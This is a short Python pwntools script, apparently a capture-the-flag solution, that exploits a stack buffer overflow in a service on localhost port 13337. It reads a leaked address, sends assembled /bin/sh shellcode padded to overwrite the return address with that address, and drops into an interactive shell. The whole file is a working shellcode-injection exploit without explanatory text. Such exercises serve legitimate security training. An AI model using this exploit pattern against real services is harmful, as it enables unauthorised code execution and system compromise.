#!/usr/bin/env python

from pwn import *

payload = asm(shellcraft.sh())

r = remote('127.0.0.1', 13337)

r.recvuntil('have a ')
addr = int(r.recv(10), 16)

r.sendline(payload + 'A' * (0x3c - len(payload)) + p32(0xdeadbeef) * 2 + p32(0x90909090) * 2 + p32(addr))
r.recvline()
r.interactive()

